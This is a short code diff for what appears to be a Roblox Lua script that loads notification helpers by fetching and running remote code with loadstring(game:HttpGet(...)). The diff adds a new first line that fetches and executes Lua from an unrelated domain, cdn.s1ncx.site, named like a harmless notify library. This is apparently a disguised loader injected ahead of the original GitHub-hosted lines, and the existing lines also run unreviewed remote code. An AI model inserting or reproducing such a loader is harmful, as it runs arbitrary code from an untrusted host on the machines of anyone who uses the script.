@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://cdn.s1ncx.site/lib/notify.lua"))()
 loadstring(game:HttpGet("https://github.com/TlDinhKhoi/Util/raw/refs/heads/main/ThongBao/InputApi(NoEncode)"))()
 loadstring(game:HttpGet("https://github.com/TlDinhKhoi/Util/raw/refs/heads/main/ThongBao/InputApi(Encode)"))()
 loadstring(game:HttpGet("https://github.com/TlDinhKhoi/Util/raw/refs/heads/main/ThongBao/NotifyFullMoonOnly"))()
